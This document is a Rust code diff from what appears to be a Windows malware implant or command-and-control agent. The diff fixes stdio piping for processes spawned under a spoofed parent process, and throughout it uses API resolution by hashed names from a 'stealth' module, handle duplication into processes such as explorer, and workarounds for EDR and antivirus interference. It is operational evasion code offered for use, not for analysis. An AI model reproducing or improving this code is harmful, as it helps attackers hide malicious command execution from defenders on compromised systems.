@@ -85,6 +85,11 @@ type CreatePipeFn = unsafe extern "system" fn(*mut usize, *mut usize, *mut u8, u
 type SetHandleInformationFn = unsafe extern "system" fn(usize, u32, u32) -> i32;
 type WriteFileFn = unsafe extern "system" fn(usize, *const u8, u32, *mut u32, *mut u8) -> i32;
 type ReadFileFn = unsafe extern "system" fn(usize, *mut u8, u32, *mut u32, *mut u8) -> i32;
+type DuplicateHandleFn =
+    unsafe extern "system" fn(usize, usize, usize, *mut usize, u32, i32, u32) -> i32;
+
+const DUPLICATE_SAME_ACCESS: u32 = 0x0000_0002;
+const DUPLICATE_CLOSE_SOURCE: u32 = 0x0000_0001;
 
 struct Kernel32SpawnApis {
     init_attr: InitAttrListFn,
@@ -95,6 +100,7 @@ struct Kernel32SpawnApis {
     set_handle_info: SetHandleInformationFn,
     write_file: WriteFileFn,
     read_file: ReadFileFn,
+    duplicate_handle: DuplicateHandleFn,
 }
 
 unsafe fn resolve_spawn_apis() -> Option<Kernel32SpawnApis> {
@@ -123,6 +129,8 @@ unsafe fn resolve_spawn_apis() -> Option<Kernel32SpawnApis> {
         stealth::get_api_addr(k32, stealth::hash_api_name(b"SetHandleInformation"))?;
     let write_file = stealth::get_api_addr(k32, stealth::hash_api_name(b"WriteFile"))?;
     let read_file = stealth::get_api_addr(k32, stealth::hash_api_name(b"ReadFile"))?;
+    let duplicate_handle =
+        stealth::get_api_addr(k32, stealth::hash_api_name(b"DuplicateHandle"))?;
 
     Some(Kernel32SpawnApis {
         init_attr: std::mem::transmute(init_attr),
@@ -133,6 +141,7 @@ unsafe fn resolve_spawn_apis() -> Option<Kernel32SpawnApis> {
         set_handle_info: std::mem::transmute(set_handle_info),
         write_file: std::mem::transmute(write_file),
         read_file: std::mem::transmute(read_file),
+        duplicate_handle: std::mem::transmute(duplicate_handle),
     })
 }
 
@@ -162,14 +171,14 @@ fn spawn_spoofed_process_inner(cmd: &str, parent_name: &str) -> Option<u32> {
                 }
                 Err(e) => {
                     crate::utils::db_print(&format!(
-                        "[Cupcake] spawn: NtCreateUserProcess failed ({e}), fallback CreateProcessW"
+                        "[agent] spawn: NtCreateUserProcess failed ({e}), fallback CreateProcessW"
                     ));
                 }
             }
         } else {
             let v = crate::stealth::version::get_windows_version();
             crate::utils::db_print(&format!(
-                "[Cupcake] spawn: OS {}.{}.{} below NtCreateUserProcess gate, using CreateProcessW",
+                "[agent] spawn: OS {}.{}.{} below NtCreateUserProcess gate, using CreateProcessW",
                 v.major, v.minor, v.build
             ));
         }
@@ -366,12 +375,52 @@ unsafe fn create_piped_process(
         let _ = crate::native::close_handle(stdin_w);
         return Err(format!("CreatePipe stdout err={}", last_error()));
     }
+    // Parent-side ends must not be inherited.
     let _ = (apis.set_handle_info)(stdin_w, HANDLE_FLAG_INHERIT, 0);
     let _ = (apis.set_handle_info)(stdout_r, HANDLE_FLAG_INHERIT, 0);
 
+    // PROC_THREAD_ATTRIBUTE_PARENT_PROCESS makes the child inherit handles from the
+    // *spoofed parent*, not the agent. Putting agent-local pipe values into
+    // STARTUPINFO yields invalid stdio → host dies → WriteFile broken pipe (109/232).
+    // Fix: DuplicateHandle child-end pipes into the parent with bInheritHandle=TRUE,
+    // then pass those parent-relative handle values in STARTUPINFO.
+    let mut parent_stdin_r: usize = 0;
+    let mut parent_stdout_w: usize = 0;
     let mut list_buf: Vec<u8> = Vec::new();
     let mut use_attr = false;
     if let Some(ph) = parent_handle {
+        if (apis.duplicate_handle)(
+            crate::native::CURRENT_PROCESS,
+            stdin_r,
+            ph,
+            &mut parent_stdin_r,
+            0,
+            1, // inherit into child of spoofed parent
+            DUPLICATE_SAME_ACCESS,
+        ) == 0
+        {
+            cleanup_pipes(stdin_r, stdin_w, stdout_r, stdout_w);
+            return Err(format!("DuplicateHandle stdin→parent err={}", last_error()));
+        }
+        if (apis.duplicate_handle)(
+            crate::native::CURRENT_PROCESS,
+            stdout_w,
+            ph,
+            &mut parent_stdout_w,
+            0,
+            1,
+            DUPLICATE_SAME_ACCESS,
+        ) == 0
+        {
+            close_remote_handle(&apis, ph, parent_stdin_r);
+            cleanup_pipes(stdin_r, stdin_w, stdout_r, stdout_w);
+            return Err(format!("DuplicateHandle stdout→parent err={}", last_error()));
+        }
+        // Agent-local child ends no longer need the inherit bit (parent holds the
+        // inheritable copies). Clear it so a stray inherit=1 cannot leak them.
+        let _ = (apis.set_handle_info)(stdin_r, HANDLE_FLAG_INHERIT, 0);
+        let _ = (apis.set_handle_info)(stdout_w, HANDLE_FLAG_INHERIT, 0);
+
         let mut list_size: usize = 0;
         let _ = (apis.init_attr)(ptr::null_mut(), 1, 0, &mut list_size);
         if list_size == 0 {
@@ -384,10 +433,14 @@ unsafe fn create_piped_process(
             if list_size > list_buf.len() {
                 list_buf.resize(list_size, 0);
                 if (apis.init_attr)(list_buf.as_mut_ptr(), 1, 0, &mut list_size) == 0 {
+                    close_remote_handle(&apis, ph, parent_stdin_r);
+                    close_remote_handle(&apis, ph, parent_stdout_w);
                     cleanup_pipes(stdin_r, stdin_w, stdout_r, stdout_w);
                     return Err(format!("InitAttrList err={}", last_error()));
                 }
             } else {
+                close_remote_handle(&apis, ph, parent_stdin_r);
+                close_remote_handle(&apis, ph, parent_stdout_w);
                 cleanup_pipes(stdin_r, stdin_w, stdout_r, stdout_w);
                 return Err(format!("InitAttrList err={}", last_error()));
             }
@@ -404,6 +457,8 @@ unsafe fn create_piped_process(
         ) == 0
         {
             (apis.delete_attr)(list_buf.as_mut_ptr());
+            close_remote_handle(&apis, ph, parent_stdin_r);
+            close_remote_handle(&apis, ph, parent_stdout_w);
             cleanup_pipes(stdin_r, stdin_w, stdout_r, stdout_w);
             return Err(format!("UpdateAttr parent err={}", last_error()));
         }
@@ -417,11 +472,16 @@ unsafe fn create_piped_process(
         std::mem::size_of::<StartupInfoW>() as u32
     };
     si_ex.startup_info.dw_flags = STARTF_USESTDHANDLES;
-    si_ex.startup_info.h_std_input = stdin_r;
-    si_ex.startup_info.h_std_output = stdout_w;
-    si_ex.startup_info.h_std_error = stdout_w;
     if use_attr {
+        // Parent-relative values — child inherits these from the spoofed parent.
+        si_ex.startup_info.h_std_input = parent_stdin_r;
+        si_ex.startup_info.h_std_output = parent_stdout_w;
+        si_ex.startup_info.h_std_error = parent_stdout_w;
         si_ex.lp_attribute_list = list_buf.as_mut_ptr();
+    } else {
+        si_ex.startup_info.h_std_input = stdin_r;
+        si_ex.startup_info.h_std_output = stdout_w;
+        si_ex.startup_info.h_std_error = stdout_w;
     }
 
     let mut cmd_w: Vec<u16> = std::ffi::OsStr::new(cmdline)
@@ -440,7 +500,7 @@ unsafe fn create_piped_process(
         cmd_w.as_mut_ptr(),
         ptr::null_mut(),
         ptr::null_mut(),
-        1, // inherit
+        1, // inherit (from spoofed parent when use_attr, else from agent)
         flags,
         ptr::null_mut(),
         ptr::null(),
@@ -452,8 +512,20 @@ unsafe fn create_piped_process(
     if use_attr {
         (apis.delete_attr)(list_buf.as_mut_ptr());
     }
+    // Always drop agent-local child ends after CreateProcess (success or fail).
+    // On success the child holds its own inherited copies via the parent.
     let _ = crate::native::close_handle(stdin_r);
     let _ = crate::native::close_handle(stdout_w);
+    // Drop the temporary copies we injected into the spoofed parent so we do not
+    // leak pipe handles into explorer/RuntimeBroker/etc.
+    if let Some(ph) = parent_handle {
+        if parent_stdin_r != 0 {
+            close_remote_handle(&apis, ph, parent_stdin_r);
+        }
+        if parent_stdout_w != 0 {
+            close_remote_handle(&apis, ph, parent_stdout_w);
+        }
+    }
 
     if ok == 0 {
         let _ = crate::native::close_handle(stdin_w);
@@ -479,6 +551,27 @@ unsafe fn create_piped_process(
     })
 }
 
+/// Close a handle that lives in another process (parent/child). Best-effort.
+unsafe fn close_remote_handle(apis: &Kernel32SpawnApis, remote_process: usize, remote_handle: usize) {
+    if remote_process == 0 || remote_handle == 0 {
+        return;
+    }
+    let mut local = 0usize;
+    // Duplicate into us + close source in the remote process, then drop local copy.
+    if (apis.duplicate_handle)(
+        remote_process,
+        remote_handle,
+        crate::native::CURRENT_PROCESS,
+        &mut local,
+        0,
+        0,
+        DUPLICATE_SAME_ACCESS | DUPLICATE_CLOSE_SOURCE,
+    ) != 0
+    {
+        let _ = crate::native::close_handle(local);
+    }
+}
+
 fn cleanup_pipes(a: usize, b: usize, c: usize, d: usize) {
     let _ = crate::native::close_handle(a);
     let _ = crate::native::close_handle(b);
@@ -487,6 +580,8 @@ fn cleanup_pipes(a: usize, b: usize, c: usize, d: usize) {
 }
 
 /// Write all bytes to a pipe handle (PEB WriteFile).
+/// On failure includes GetLastError — 109/232 usually means child already exited
+/// (broken pipe), not a generic I/O glitch.
 pub fn pipe_write_all(handle: usize, data: &[u8]) -> Result<(), String> {
     unsafe {
         let apis = resolve_spawn_apis().ok_or("spawn apis")?;
@@ -502,11 +597,59 @@ pub fn pipe_write_all(handle: usize, data: &[u8]) -> Result<(), String> {
                 ptr::null_mut(),
             );
             if ok == 0 || written == 0 {
-                return Err("WriteFile failed".into());
+                let err = last_error();
+                let hint = match err {
+                    // Historically also caused by PPID-spoof spawn that never injected
+                    // pipe handles into the spoofed parent (fixed in spawn/ghost_host).
+                    109 | 232 => " (broken pipe: child exited/closed stdin before job write — check worker PE, AV, or PPID pipe inherit)",
+                    6 => " (invalid handle)",
+                    5 => " (access denied)",
+                    0 if written == 0 => " (zero bytes written)",
+                    _ => "",
+                };
+                return Err(format!(
+                    "WriteFile failed err={err} wrote={written}/{chunk} off={off}/{}{hint}",
+                    data.len()
+                ));
             }
             off += written as usize;
         }
         Ok(())
+    }
+}
+
+/// Best-effort: has the process already exited? (for clearer spawn/pipe errors)
+pub fn process_has_exited(h_process: usize) -> Option<bool> {
+    if h_process == 0 {
+        return None;
+    }
+    // Prefer GetExitCodeProcess: STILL_ACTIVE=259. Wait signal can lag briefly after
+    // ACCESS_VIOLATION kills under some EDR hooks (we previously reported
+    // child_exited=false with exit_code=0xC0000005).
+    if let Some(code) = process_exit_code(h_process) {
+        if code != 259 {
+            return Some(true);
+        }
+    }
+    // Wait 0 ms: signaled => already exited
+    Some(crate::native::wait_for_single_object_timeout(h_process, 0))
+}
+
+/// Best-effort exit code via GetExitCodeProcess (STILL_ACTIVE = 259).
+pub fn process_exit_code(h_process: usize) -> Option<u32> {
+    if h_process == 0 {
+        return None;
+    }
+    unsafe {
+        let k32 = stealth::get_module_base(stealth::hash_module_name(b"kernel32.dll"));
+        let addr = stealth::get_api_addr(k32, stealth::hash_api_name(b"GetExitCodeProcess"))?;
+        type GetExitCodeProcessFn = unsafe extern "system" fn(usize, *mut u32) -> i32;
+        let f: GetExitCodeProcessFn = std::mem::transmute(addr);
+        let mut code = 0u32;
+        if f(h_process, &mut code) == 0 {
+            return None;
+        }
+        Some(code)
     }
 }
 
